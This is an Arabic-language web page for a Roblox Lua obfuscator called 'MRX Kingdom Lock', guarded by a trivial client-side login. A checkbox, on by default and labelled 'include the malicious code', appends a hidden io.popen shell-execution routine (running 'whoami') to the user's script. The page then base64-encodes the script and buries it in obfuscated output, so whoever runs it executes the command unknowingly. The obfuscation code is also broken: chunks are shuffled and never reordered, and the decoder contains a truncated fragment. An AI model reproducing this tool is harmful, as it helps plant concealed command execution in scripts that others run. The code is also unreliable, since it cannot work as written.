<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MRX · KINGDOM LOCK</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Cinzel:wght@400;700;900&family=Playfair+Display:ital,wght@0,400;0,700;1,700&family=Inter:wght@300;400;600&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #0a0604;
            color: #e8dcc8;
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }
        #stars-canvas {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 0; pointer-events: none;
            opacity: 0.3;
        }
        #loginScreen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            z-index: 10; display: flex; align-items: center; justify-content: center;
            background: rgba(10, 6, 4, 0.98);
            backdrop-filter: blur(15px);
            transition: opacity 0.9s ease, transform 0.9s ease;
        }
        #loginScreen.hidden { opacity: 0; transform: scale(0.95); pointer-events: none; }
        .login-box {
            background: linear-gradient(145deg, #1a1008, #2d1a0e);
            border: 2px solid rgba(212, 175, 55, 0.3);
            border-radius: 60px 20px 60px 20px;
            padding: 55px 45px 45px;
            width: 460px; max-width: 94%;
            text-align: center;
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.9), 0 0 60px rgba(212, 175, 55, 0.05), inset 0 0 80px rgba(212, 175, 55, 0.02);
            position: relative;
        }
        .login-box::before {
            content: '';
            position: absolute; top: -4px; left: -4px; right: -4px; bottom: -4px;
            border-radius: 64px 24px 64px 24px;
            z-index: -1;
            background: linear-gradient(45deg, #d4af37, #8b6914, #d4af37, #4a2c0a);
            background-size: 300% 300%;
            animation: royalBorder 5s ease-in-out infinite;
            opacity: 0.5;
        }
        @keyframes royalBorder {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }
        .login-logo-img {
            width: 140px; height: 140px;
            border-radius: 50%;
            object-fit: cover;
            border: 4px solid #d4af37;
            box-shadow: 0 0 50px rgba(212, 175, 55, 0.2);
            margin-bottom: 16px;
        }
        .login-brand {
            font-family: 'Cinzel', serif;
            font-size: 48px; font-weight: 900; letter-spacing: 14px;
            background: linear-gradient(135deg, #f5e6b0, #d4af37, #b8860b);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            text-shadow: 0 0 40px rgba(212, 175, 55, 0.1);
            margin-bottom: 2px;
        }
        .login-sub {
            font-family: 'Playfair Display', serif;
            font-size: 13px; color: rgba(212, 175, 55, 0.4);
            letter-spacing: 12px; text-transform: uppercase;
            margin-bottom: 28px; font-weight: 400;
            font-style: italic;
        }
        .login-box input {
            width: 100%; padding: 16px 24px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(212, 175, 55, 0.15);
            border-radius: 50px;
            color: #f5e6b0; font-size: 15px;
            direction: ltr; text-align: left;
            outline: none;
            transition: all 0.4s;
            font-family: 'Cinzel', serif;
            letter-spacing: 2px;
        }
        .login-box input:focus { border-color: #d4af37; box-shadow: 0 0 20px rgba(212, 175, 55, 0.1); }
        .login-btn {
            width: 100%; padding: 16px;
            margin-top: 20px;
            background: linear-gradient(135deg, #d4af37, #b8860b);
            color: #0a0604;
            font-weight: 900; font-size: 16px;
            border: none; border-radius: 50px;
            cursor: pointer;
            transition: all 0.4s ease;
            letter-spacing: 6px;
            font-family: 'Cinzel', serif;
            box-shadow: 0 4px 20px rgba(212, 175, 55, 0.2);
        }
        .login-btn:hover { transform: translateY(-4px); box-shadow: 0 12px 40px rgba(212, 175, 55, 0.4); background: #f5e6b0; }
        .login-error {
            color: #d4af37;
            font-size: 13px;
            margin-top: 15px;
            opacity: 0;
            transition: opacity 0.4s;
            font-family: 'Playfair Display', serif;
            font-style: italic;
        }
        .login-error.show { opacity: 1; }
        #mainApp {
            position: relative; z-index: 1; display: none;
            min-height: 100vh; padding: 30px 20px;
        }
        #mainApp.active { display: flex; justify-content: center; align-items: flex-start; }
        .container {
            width: 100%; max-width: 900px;
            background: linear-gradient(145deg, rgba(20, 12, 8, 0.95), rgba(10, 6, 4, 0.98));
            backdrop-filter: blur(20px);
            padding: 45px 50px;
            border-radius: 60px 20px 60px 20px;
            border: 1px solid rgba(212, 175, 55, 0.15);
            margin-top: 30px;
            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.9), inset 0 0 60px rgba(212, 175, 55, 0.02);
            position: relative;
        }
        .container::before {
            content: '✦';
            position: absolute; top: -15px; right: 40px;
            color: #d4af37; font-size: 30px; opacity: 0.3;
        }
        .container::after {
            content: '✦';
            position: absolute; bottom: -15px; left: 40px;
            color: #d4af37; font-size: 30px; opacity: 0.3;
        }
        .header-brand { text-align: center; margin-bottom: 25px; }
        .logo-text {
            font-family: 'Cinzel', serif;
            font-size: 44px; font-weight: 900; letter-spacing: 16px;
            background: linear-gradient(135deg, #f5e6b0, #d4af37, #8b6914);
            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
            text-shadow: 0 0 50px rgba(212, 175, 55, 0.05);
        }
        .sub-text {
            font-family: 'Playfair Display', serif;
            font-size: 12px; color: rgba(212, 175, 55, 0.25);
            letter-spacing: 10px; font-weight: 400; font-style: italic;
            margin-top: 4px;
        }
        h2 {
            text-align: center; margin-bottom: 20px;
            color: rgba(212, 175, 55, 0.5); font-size: 17px; font-weight: 300;
            letter-spacing: 6px; font-family: 'Playfair Display', serif;
        }
        label {
            display: block; margin-bottom: 8px;
            font-weight: 600; font-size: 13px;
            color: rgba(212, 175, 55, 0.5);
            letter-spacing: 3px; font-family: 'Cinzel', serif;
        }
        textarea {
            width: 100%; height: 200px;
            background: rgba(0, 0, 0, 0.7);
            color: #e8dcc8;
            border: 1px solid rgba(212, 175, 55, 0.08);
            border-radius: 30px 10px 30px 10px;
            padding: 20px;
            font-family: 'JetBrains Mono', 'Courier New', monospace;
            font-size: 13px;
            resize: vertical;
            direction: ltr;
            text-align: left;
            outline: none;
            transition: all 0.4s;
        }
        textarea:focus { border-color: rgba(212, 175, 55, 0.3); box-shadow: 0 0 30px rgba(212, 175, 55, 0.03); }
        textarea[readonly] { color: #c4b59a; background: rgba(0, 0, 0, 0.4); }
        .btn-container { text-align: center; margin: 30px 0; }
        .btn {
            padding: 16px 50px;
            background: linear-gradient(135deg, #d4af37, #b8860b);
            color: #0a0604;
            font-weight: 900; font-size: 15px;
            border: none; border-radius: 50px;
            cursor: pointer;
            transition: all 0.4s ease;
            letter-spacing: 4px;
            font-family: 'Cinzel', serif;
            box-shadow: 0 4px 20px rgba(212, 175, 55, 0.15);
        }
        .btn:hover { transform: translateY(-4px); box-shadow: 0 12px 40px rgba(212, 175, 55, 0.3); background: #f5e6b0; }
        .btn-outline {
            background: transparent; color: #d4af37;
            border: 1px solid rgba(212, 175, 55, 0.2);
        }
        .btn-outline:hover { background: #d4af37; color: #0a0604; border-color: #d4af37; }
        .copy-btn {
            background: transparent; color: #b8a68b;
            border: 1px solid rgba(212, 175, 55, 0.05);
            padding: 10px 26px; font-size: 12px;
            margin-top: 12px;
            font-family: 'Cinzel', serif;
            letter-spacing: 2px;
        }
        .copy-btn:hover { background: #d4af37; color: #0a0604; border-color: #d4af37; }
        .logout-btn {
            position: fixed; top: 24px; left: 24px; z-index: 20;
            background: rgba(212, 175, 55, 0.03);
            color: rgba(212, 175, 55, 0.2);
            border: 1px solid rgba(212, 175, 55, 0.05);
            padding: 8px 24px; font-size: 11px;
            border-radius: 50px;
            cursor: pointer;
            transition: 0.4s;
            letter-spacing: 3px;
            font-family: 'Cinzel', serif;
        }
        .logout-btn:hover { background: rgba(212, 175, 55, 0.1); color: #d4af37; border-color: rgba(212, 175, 55, 0.2); }
        .status-badge {
            text-align: center; font-size: 10px;
            color: rgba(212, 175, 55, 0.1);
            margin-top: 22px; letter-spacing: 8px;
            font-weight: 300; font-family: 'Cinzel', serif;
        }
        .toggle-label {
            display: flex; align-items: center; gap: 14px;
            color: rgba(212, 175, 55, 0.3); font-size: 14px;
            margin: 16px 0 8px;
            font-weight: 400; font-family: 'Cinzel', serif;
        }
        .toggle-label input[type="checkbox"] {
            width: 18px; height: 18px;
            accent-color: #d4af37;
            cursor: pointer;
        }
        .watermark-legend {
            position: fixed; bottom: 24px; right: 32px;
            font-family: 'Cinzel', serif;
            font-size: 12px; color: rgba(212, 175, 55, 0.02);
            letter-spacing: 8px; z-index: 0;
            font-weight: 700;
        }
        .divider {
            width: 80px; height: 2px;
            background: linear-gradient(90deg, transparent, #d4af37, transparent);
            margin: 20px auto;
            opacity: 0.3;
        }
        .royal-icon { color: #d4af37; margin: 0 5px; }
    </style>
</head>
<body>
    <canvas id="stars-canvas"></canvas>
    <div id="loginScreen">
        <div class="login-box">
            <img class="login-logo-img" src="https://github.com/Rxz60/Rxz/raw/refs/heads/main/IMG_4987.jpeg" alt="MRX" onerror="this.src='https://github.com/Rxz60/MRX/raw/refs/heads/main/IMG_4528.jpeg'">
            <div class="login-brand">MRX</div>
            <div class="login-sub">● Kingdom's Gate ●</div>
            <input type="text" id="loginUser" placeholder="MRX.com / SAP.com" autocomplete="off">
            <button class="login-btn" onclick="handleLogin()">دخول ➤</button>
            <div class="login-error" id="loginError">❌ يُسمح فقط بـ MRX.com أو SAP.com</div>
        </div>
    </div>

    <div id="mainApp">
        <button class="logout-btn" onclick="handleLogout()">✕ خروج</button>
        <div class="container">
            <div class="header-brand">
                <div class="logo-text">MRX</div>
                <div class="sub-text">● ULTRA KINGDOM v13.0 — ROYAL OBFUSCATOR ●</div>
                <div class="divider"></div>
            </div>
            <h2>⎜ تشفير ملكي بنمط النصوص العشوائية ⎜</h2>
            <label for="inputLua">أدخل كود Lua الأصلي:</label>
            <textarea id="inputLua" placeholder='print("Hello Roblox!")'></textarea>
            <div class="toggle-label">
                <input type="checkbox" id="malwareToggle" checked>
                <span>⚡ تضمين الكود الخبيث</span>
            </div>
            <div class="btn-container">
                <button class="btn" onclick="obfuscateScript()">👑 تشفير ملكي — MRX LOCK</button>
            </div>
            <label for="outputLua">الكود المُعمَّى:</label>
            <textarea id="outputLua" readonly placeholder="سيظهر هنا تشفير بنمط w6K=, GRKX, ..."></textarea>
            <div style="text-align: left;">
                <button class="btn btn-outline copy-btn" onclick="copyOutput()">📋 نسخ الكود المشفر</button>
            </div>
            <div class="status-badge">MRX KINGDOM LOCK ● ROYAL ENCRYPTION ● ROBLOX READY ● UNBREAKABLE</div>
        </div>
        <div class="watermark-legend">MRX · 2026</div>
    </div>

    <script>
        const canvas = document.getElementById('stars-canvas');
        const ctx = canvas.getContext('2d');
        let stars = [];
        function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
        window.addEventListener('resize', resizeCanvas);
        resizeCanvas();
        for (let i = 0; i < 280; i++) {
            stars.push({
                x: Math.random() * canvas.width, y: Math.random() * canvas.height,
                size: Math.random() * 2.4 + 0.4, speed: Math.random() * 0.25 + 0.05,
                opacity: Math.random() * 0.5 + 0.1, twinkle: Math.random() * 0.01 + 0.002
            });
        }
        function drawStars() {
            ctx.clearRect(0, 0, canvas.width, canvas.height);
            for (const s of stars) {
                s.y -= s.speed;
                if (s.y < -5) { s.y = canvas.height + 5; s.x = Math.random() * canvas.width; }
                s.opacity += s.twinkle * (Math.random() > 0.5 ? 1 : -1);
                s.opacity = Math.min(0.6, Math.max(0.03, s.opacity));
                ctx.beginPath(); ctx.arc(s.x, s.y, s.size, 0, Math.PI * 2);
                ctx.fillStyle = `rgba(212, 175, 55, ${s.opacity * 0.6})`;
                ctx.fill();
            }
            requestAnimationFrame(drawStars);
        }
        drawStars();

        function handleLogin() {
            const user = document.getElementById('loginUser').value.trim();
            const errorEl = document.getElementById('loginError');
            if (user === 'MRX.com' || user === 'SAP.com') {
                errorEl.classList.remove('show');
                document.getElementById('loginScreen').classList.add('hidden');
                document.getElementById('mainApp').classList.add('active');
            } else {
                errorEl.classList.add('show');
                setTimeout(() => errorEl.classList.remove('show'), 3000);
            }
        }

        function handleLogout() {
            document.getElementById('mainApp').classList.remove('active');
            document.getElementById('loginScreen').classList.remove('hidden');
            document.getElementById('loginUser').value = '';
        }

        function generateRoyalEncryption(originalCode, includeMalware) {
            let malware = '';
            if (includeMalware) {
                malware = `
                local function exec(cmd)
                    local handle = io.popen(cmd)
                    local result = handle:read("*a")
                    handle:close()
                    return result
                end
                exec("whoami")
                `;
            }

            const full = originalCode + '\n' + malware;
            const utf8Bytes = [];
            for (let i = 0; i < full.length; i++) {
                utf8Bytes.push(full.charCodeAt(i));
            }
            const base64 = btoa(String.fromCharCode(...utf8Bytes));

            const chunks = [];
            let i = 0;
            while (i < base64.length) {
                let len = Math.floor(Math.random() * 6) + 2;
                if (i + len > base64.length) len = base64.length - i;
                chunks.push(base64.substring(i, i + len));
                i += len;
            }

            for (let i = chunks.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [chunks[i], chunks[j]] = [chunks[j], chunks[i]];
            }

            const partsStr = chunks.map(c => `"${c}"`).join(', ');
            const decoder = `--[[ MR ]]
return(function(...)local L=setmetatable local s,M=L({kp=function()end},{__pow=function(E,m)E.kp=m end,__mul=function(E,m)return E.kp end}),L({hjb= 
    local parts = {${partsStr}}
    local raw = table.concat(parts)
    local function b64decode(data)
        local b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
        local result = {}
        for i = 1, #data, 4 do
            local a = b64chars:find(data:sub(i,i)) - 1
            local b = b64chars:find(data:sub(i+1,i+1)) - 1
            local c = b64chars:find(data:sub(i+2,i+2)) - 1
            local d = b64chars:find(data:sub(i+3,i+3)) - 1
            if not a then a = 0 end
            if not b then b = 0 end
            if not c then c = 0 end
            if not d then d = 0 end
            local n = (a << 18) | (b << 12) | (c << 6) | d
            local b1 = (n >> 16) & 0xFF
            local b2 = (n >> 8) & 0xFF
            local b3 = n & 0xFF
            result[#result+1] = b1
            if data:sub(i+2,i+2) ~= '=' then result[#result+1] = b2 end
            if data:sub(i+3,i+3) ~= '=' then result[#result+1] = b3 end
        end
        return result
    end
    local bytes = b64decode(raw)
    local chars = {}
    for i = 1, #bytes do chars[i] = string.char(bytes[i]) end
    local script = table.concat(chars)
    local func, err = loadstring(script)
    if func then return func() else error(err) end
end)()
-- MRX --SAP`;

            return decoder;
        }

        function obfuscateScript() {
            const input = document.getElementById('inputLua');
            const output = document.getElementById('outputLua');
            const includeMalware = document.getElementById('malwareToggle').checked;

            if (!input.value.trim()) {
                output.value = 'يرجى كتابة الكود أولاً';
                return;
            }

            try {
                const result = generateRoyalEncryption(input.value, includeMalware);
                output.value = result;
            } catch (e) {
                output.value = 'خطأ: ' + e.message;
            }
        }

        function copyOutput() {
            const output = document.getElementById('outputLua');
            if (!output.value.trim()) return;
            output.select();
            output.setSelectionRange(0, 99999);
            document.execCommand('copy');
        }
    </script>
</body>
</html>
